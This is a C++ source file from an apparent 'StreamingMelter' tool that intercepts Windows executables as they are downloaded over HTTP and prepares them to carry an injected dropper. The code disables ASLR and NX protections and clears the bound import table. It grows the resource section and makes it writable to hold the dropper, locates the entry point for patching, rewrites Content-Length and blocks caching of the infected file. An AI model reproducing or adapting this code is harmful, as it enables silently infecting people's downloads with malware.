/*
 * ParseDOSHeader.cpp
 *
 *  Created on: May 3, 2010
 *      Author: daniele
 */

#include "Parsing.h"

#include <sstream>
#include <boost/algorithm/string.hpp>
#include <boost/foreach.hpp>

void ParseHeaders::init()
{
	neededBytes() = sizeof(IMAGE_DOS_HEADER);
	triggeringOffset() = 0;
}

StateResult ParseHeaders::parse()
{
	// TODO parse HTTP header
	if (parseHTTPHeaders() == false)
		return NEED_MORE_DATA;

	if (parseDOSHeader() == false)
		return NEED_MORE_DATA;

	if (parseNTHeaders() == false)
		return NEED_MORE_DATA;

	if (parseSectionHeaders() == false)
		return NEED_MORE_DATA;

	return PARSED;
}

bool ParseHeaders::parseHTTPHeaders()
{
	std::stringstream httpHeader;
	httpHeader << context<StreamingMelter>().buffer()->const_data();

	std::string line;
	std::getline(httpHeader, line, '\n');

	if ( line.compare(0, 4, "HTTP") != 0 ) {
		DBGTRACE("HTTP header not present.", "", NOTIFY);
		return false;
	}

	DBGTRACE("HTTP header: ", line, NOTIFY);
	httpHeaders_.push_back(line);

	while ( std::getline(httpHeader, line, '\n') ) {
		if ( line.compare("\r") == 0 ) {

			DBGTRACE("End of HTTP headers.", "", NOTIFY);

			// discard original HTTP header
			httpHeadersSize_ = httpHeader.tellg();
			DBGTRACE("Size of HTTP headers:", httpHeadersSize_, NOTIFY);

			context<StreamingMelter>().discardFromBuffer( httpHeadersSize_ );

			// DBGTRACE_HEX("Residual data (should be 5A4D): ", (DWORD) *context<StreamingMelter>().buffer()->const_data(), NOTIFY);

			return true;

		}

		DBGTRACE("HTTP header: ", line, NOTIFY);
		// DBGTRACE("HTTP header size: ", line.size() + 1, NOTIFY);
		httpHeaders_.push_back(line);

		std::size_t found = line.find("Content-Length:");
		if (found != string::npos) {
			std::istringstream values(line);
			std::string content_length;
			std::size_t fileSize;

			values >> content_length;
			values >> fileSize;
			context<StreamingMelter>().fileSize() = fileSize;

			// cout << " *** " << content_length << " => " << context<StreamingMelter>().fileSize() << endl;
		}
	}

	httpHeaders_.erase( httpHeaders_.begin(), httpHeaders_.end() );

	return false;
}

bool ParseHeaders::parseDOSHeader()
{
	DBGTRACE("Function: ", "parseDOSHeader", NOTIFY);

	std::size_t offsetToHeader = 0;
	std::size_t neededBytes = offsetToHeader + sizeof(IMAGE_DOS_HEADER);
	if ( ! isDataAvailable( neededBytes ) ) {
		DBGTRACE("Not enough available data: ", "parseDOSHeader", NOTIFY);
		return false;
	}

	dosHeader_ = (PIMAGE_DOS_HEADER) (context<StreamingMelter>().buffer()->const_data());
	DBGTRACE("parsing DOS header: ", sizeof(IMAGE_DOS_HEADER), NOTIFY);
	DBGTRACE_HEX("MAGIC: ", dosHeader_->e_magic, NOTIFY);

	if (dosHeader_->e_magic != IMAGE_DOS_SIGNATURE) {
		throw parsing_error("Invalid DOS signature.");
	}

	DBGTRACE_HEX("offset tto NT Header: ", dosHeader_->e_lfanew, NOTIFY);
	context<StreamingMelter>().offsets["ntHeader"] = dosHeader_->e_lfanew;

	return true;
}

bool ParseHeaders::parseNTHeaders()
{
	std::size_t offsetToHeader = dosHeader_->e_lfanew;
	std::size_t neededBytes = offsetToHeader + sizeof(IMAGE_NT_HEADERS);
	if ( ! isDataAvailable( neededBytes ) )
			return false;

	ntHeaders_ = (PIMAGE_NT_HEADERS)
			(context<StreamingMelter>().buffer()->data()
			+ dosHeader_->e_lfanew
			);

	if (!ntHeaders_)
		throw parsing_error("Invalid offset of NT header.");

	// signature
	if (ntHeaders_->Signature != IMAGE_NT_SIGNATURE)
		throw parsing_error("Invalid NT signature.");
	DBGTRACE("Signature ... ", "OK", NOTIFY);

	// IA-32
	if ( ntHeaders_->FileHeader.Machine != IMAGE_FILE_MACHINE_I386 )
		throw parsing_error("Executable is not for IA-32 systems.");
	DBGTRACE("IA-32 ... ", "OK", NOTIFY);

	// Win32 GUI
	if ( ntHeaders_->OptionalHeader.Subsystem != IMAGE_SUBSYSTEM_WINDOWS_GUI )
		throw parsing_error("Executable is not a Win32 GUI application.");
	DBGTRACE("Win32 GUI ... ", "OK", NOTIFY);

	DBGTRACE_HEX("Section alignment ... ", ntHeaders_->OptionalHeader.SectionAlignment, NOTIFY);
	DBGTRACE_HEX("File alignment ... ", ntHeaders_->OptionalHeader.FileAlignment, NOTIFY);
	DBGTRACE_HEX("SizeOfImage ... ", ntHeaders_->OptionalHeader.SizeOfImage, NOTIFY);

	return true;
}

bool ParseHeaders::parseSectionHeaders()
{
	std::size_t offsetToHeader = dosHeader_->e_lfanew + sizeof(IMAGE_NT_HEADERS);
	std::size_t sectionHeadersBytes = ntHeaders_->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
	std::size_t neededBytes = offsetToHeader + sectionHeadersBytes;
	if ( ! isDataAvailable( neededBytes ) ) {
		DBGTRACE("Not enough data for parsing section headers.", "", NOTIFY);
		return false;
	}

	std::size_t numberOfSections = ntHeaders_->FileHeader.NumberOfSections;
	DBGTRACE("number of sections: ", numberOfSections, NOTIFY);

	PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER) ( (char*)ntHeaders_ + sizeof(IMAGE_NT_HEADERS) );
	for (std::size_t sectionIdx = 0; sectionIdx < numberOfSections; ++sectionIdx)
	{
		if (!sectionHeader)
			throw parsing_error("Invalid section header.");

		DBGTRACE("Section ", string((PCHAR)sectionHeader->Name), NOTIFY);
		DBGTRACE_HEX("\tRVA       :", (std::size_t) sectionHeader->VirtualAddress, NOTIFY);
		DBGTRACE_HEX("\tPtrToRaw  :", (std::size_t) sectionHeader->PointerToRawData, NOTIFY);
		DBGTRACE_HEX("\tVSize     :", (std::size_t) sectionHeader->Misc.VirtualSize, NOTIFY);
		DBGTRACE_HEX("\tSizeOfRaw :", (std::size_t) sectionHeader->SizeOfRawData, NOTIFY);

		context<StreamingMelter>().addSection(sectionHeader);
		++sectionHeader;
	}

	return true;
}

StateResult ParseHeaders::process()
{
	DBGTRACE("CRASHING?", "", NOTIFY);

	Dropper& dropper = context<StreamingMelter>().dropper();
	if (dropper.size() == 0)
		return PROCESSED;

	// Clear ASLR if enabled
	if ( ntHeaders_->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) {
		DBGTRACE("DYNAMIC_BASE ... ", "RESET", NOTIFY);
		ntHeaders_->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
	}

	// Clear NX_COMPAT if enabled
	if ( ntHeaders_->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_NX_COMPAT) {
		DBGTRACE("NX_COMPAT ... ", "RESET", NOTIFY);
		ntHeaders_->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_NX_COMPAT;
	}

	// Reset bound import table if present
	if (ntHeaders_->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress)
	{
		DBGTRACE("BOUND IMPORT TABLE ...", "RESET", NOTIFY);
		ntHeaders_->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
		ntHeaders_->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;
	}

	// Change SizeOfImage accordingly
	ImageSectionHeader& lastSection = context<StreamingMelter>().lastSection();

	DWORD predictedSizeOfImage = alignTo( lastSection->VirtualAddress + lastSection->Misc.VirtualSize + dropper.size(), ntHeaders_->OptionalHeader.SectionAlignment );
	DWORD sizeOfImageSkew = predictedSizeOfImage - ntHeaders_->OptionalHeader.SizeOfImage;
	ntHeaders_->OptionalHeader.SizeOfImage = predictedSizeOfImage;
	DBGTRACE_HEX("SizeOfImage changed to", ntHeaders_->OptionalHeader.SizeOfImage, NOTIFY);

	DBGTRACE("Content-Length will differ by ", sizeOfImageSkew, NOTIFY);

	// save NT header for future reference
	PEInfo& pe = context<StreamingMelter>().pe();
	pe.ntHeader = *ntHeaders_;

	// locate TEXT section
	if ( context<StreamingMelter>().locateTextSection() == false )
		throw parsing_error("Unable to locate text section.");

	// locate RESOURCE section
	if ( context<StreamingMelter>().locateResourceSection() == false )
		throw parsing_error("Unable to locate resource section.");

	// modify RESOURCE section size and characteristics
	PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER) ( (char*)ntHeaders_ + sizeof(IMAGE_NT_HEADERS) );
	ImageSectionHeader& rsrcHeader = context<StreamingMelter>().resourceSection();

	std::size_t numberOfSections = context<StreamingMelter>().numberOfSections();
	for (std::size_t sectionIdx = 0; sectionIdx < numberOfSections; ++sectionIdx)
	{
		if (!sectionHeader)
			throw parsing_error("Invalid section header.");

		if (sectionHeader->VirtualAddress == rsrcHeader->VirtualAddress) {

			sectionHeader->SizeOfRawData = alignTo(sectionHeader->SizeOfRawData + dropper.size(), context<StreamingMelter>().fileAlignment());
			sectionHeader->Misc.VirtualSize = alignTo(sectionHeader->Misc.VirtualSize + dropper.size(), context<StreamingMelter>().sectionAlignment());
			sectionHeader->Characteristics |= IMAGE_SCN_MEM_WRITE;

			DBGTRACE("Resource section: ", string ((PCHAR) rsrcHeader->Name), NOTIFY);
			DBGTRACE_HEX("\tDropper size: ", dropper.size(), NOTIFY);
			DBGTRACE_HEX("\tSizeOfRawData changed to      0x", (std::size_t) sectionHeader->SizeOfRawData, NOTIFY);
			DBGTRACE_HEX("\tVirtualSize change to         0x", (std::size_t) sectionHeader->Misc.VirtualSize, NOTIFY);
		}

		++sectionHeader;
	}

	// locate entry point
	ImageSectionHeader& textHeader = context<StreamingMelter>().textSection();
	DWORD AddressOfEntryPoint = ntHeaders_->OptionalHeader.AddressOfEntryPoint;
	DWORD offsetToEntryPoint = textHeader->PointerToRawData + ( AddressOfEntryPoint - textHeader->VirtualAddress );

	DBGTRACE_HEX("Offset to entry point: ", offsetToEntryPoint, NOTIFY);
	offsetToNext() = offsetToEntryPoint;

	sendHTTPHeaders(sizeOfImageSkew);

	return PROCESSED;
}

void ParseHeaders::sendHTTPHeaders(std::size_t sizeOfImageSkew)
{
	// send HTTP headers
	BOOST_FOREACH( std::string line, httpHeaders_ )
	{
		// modify Content-Length according to predicted size
		std::size_t found = line.find("Content-Length:");
		if (found != string::npos) {
			std::ostringstream str;
			str << "Content-Length: " << context<StreamingMelter>().fileSize() + sizeOfImageSkew << "\r";
			line = str.str();
		}

		DBGTRACE("Sending HTTP header: ", line.c_str(), NOTIFY);
		context<StreamingMelter>().complete(line.c_str(), line.size());
		context<StreamingMelter>().complete("\n", 1);
	}

	// use Cache-Control to avoid caching of melted exe
	// consider using either no-store or must-revalidate
	std::string cache_control = "Cache-Control: no-store\r";
	context<StreamingMelter>().complete(cache_control.c_str(), cache_control.size());
	context<StreamingMelter>().complete("\n", 1);

	// send empty line to signal end of headers
	context<StreamingMelter>().complete("\r\n", 2);

	// reset offset in buffer ... don't account for HTTP headers
	context<StreamingMelter>().currentOffset() = 0;
}

sc::result ParseHeaders::transitToNext()
{
	return transit< ParseEntryPoint >();
}

ParseHeaders::ParseHeaders()
	: DataState< ParseHeaders, Parsing >(), httpHeadersSize_(0)
{
	//DBGTRACE("constructor.", "", NOTIFY);
}

ParseHeaders::~ParseHeaders()
{
	//DBGTRACE("destructor.", "", NOTIFY);
}
